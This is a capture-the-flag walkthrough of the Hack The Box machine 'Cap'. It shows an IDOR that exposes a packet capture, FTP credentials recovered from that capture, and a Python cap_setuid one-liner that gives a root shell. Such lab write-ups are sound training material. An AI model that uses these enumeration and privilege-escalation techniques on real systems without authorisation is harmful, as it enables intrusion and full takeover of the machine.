---
title: "HTB: Cap"
tags: [htb, linux, easy, pcap, idor, capabilities]

description: "Analyzing packet captures (PCAP) to find plain text creds and abusing Linux Capabilities (setcap) for root."
---

# Hack The Box: Cap

**Machine IP**: `10.10.10.245`
**OS**: Linux (Ubuntu)
**Difficulty**: Easy

Cap is a modern box that focuses on two specific concepts: **IDOR** (Insecure Direct Object Reference) leading to information disclosure, and Linux **Capabilities** (the "Cap" in the name).

---

## 1. Reconnaissance

```bash
nmap -sC -sV 10.10.10.245
```
*   **21 (FTP)**: Vsftpd 3.0.3
*   **22 (SSH)**
*   **80 (HTTP)**: Gunicorn (Python app)

The website is a dashboard showing network statistics ("Security Dashboard").

## 2. Exploitation (IDOR to Creds)

On the website, if we click "Security Snapshot (5 seconds)", it captures packets and offers a download: `http://10.10.10.245/data/1`.
*   The URL parameter is just `1`.
*   What happens if we change it to `0`?
    `http://10.10.10.245/data/0`

We download the `0.pcap` file and open it in Wireshark.
We see traffic where a user (`nathan`) logs into FTP.
**FTP Command**: `USER nathan`
**FTP Command**: `PASS Buck3tH4TF0RM3!`

We now have ssh credentials.
`ssh nathan@10.10.10.245`

---

## 3. Privilege Escalation

Nathan can't run sudo. We check for SUID binaries, found nothing.
We check for **Capabilities**:
```bash
getcap -r / 2>/dev/null
```

**Output**:
```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This is dangerous. `cap_setuid` means Python can set the UID of the process to 0 (root) without needing sudo.

**Exploit**:
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

We instantly drop into a root shell.
`root@cap:~#`

## Conclusion
*   **User Flag**: `/home/nathan/user.txt`
*   **Root Flag**: `/root/root.txt`

Linux Capabilities allow granular permission control (allowing a web server to bind port 80 without being root), but `cap_setuid` is effectively giving the binary full root power.
